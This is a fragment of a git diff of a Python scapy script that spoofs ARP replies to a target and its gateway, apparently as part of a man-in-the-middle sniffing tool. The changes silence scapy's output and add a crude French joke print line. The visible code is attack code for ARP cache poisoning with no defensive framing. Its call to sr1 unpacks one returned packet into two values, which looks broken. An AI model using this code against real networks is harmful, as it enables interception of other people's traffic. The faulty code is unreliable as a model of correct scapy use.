@@ -4,7 +4,7 @@ from scapy.sendrecv import send, sr1
 var = True
 
 def spoofarpcache(targetip, targetmac, sourceip):
-	results, unans= sr1(ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac))
+	results, unans= sr1(ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac), verbose=False)
 	print(results)
 
 def restorearp(targetip, targetmac, sourceip, sourcemac):
@@ -31,6 +31,7 @@ def SingleSniffing(targetip):
 			print("Sending spoofed ARP responses")
 			#while var:
 			spoofarpcache(targetip, targetmac, gatewayip)
+			print("J'en ai marre stop toi et marche ta mère la reine des chocolat")
 			spoofarpcache(gatewayip, gatewaymac, targetip)
 			print("J'en ai marre stop toi et marche ta mère la reine des caramels")
 		except KeyboardInterrupt:
